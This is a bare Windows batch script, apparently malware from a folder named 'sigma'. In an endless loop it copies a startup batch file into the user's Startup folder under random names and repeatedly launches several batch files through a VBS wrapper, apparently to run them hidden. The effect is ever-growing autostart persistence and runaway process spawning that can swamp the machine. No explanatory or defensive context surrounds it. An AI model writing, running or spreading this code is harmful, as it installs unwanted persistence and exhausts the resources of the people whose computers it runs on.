@echo off
:loop
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\d%random%d.bat
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\filel.bat
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\file.bat
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\sigma.bat
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\copy.bat
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\startup.bat
goto loop
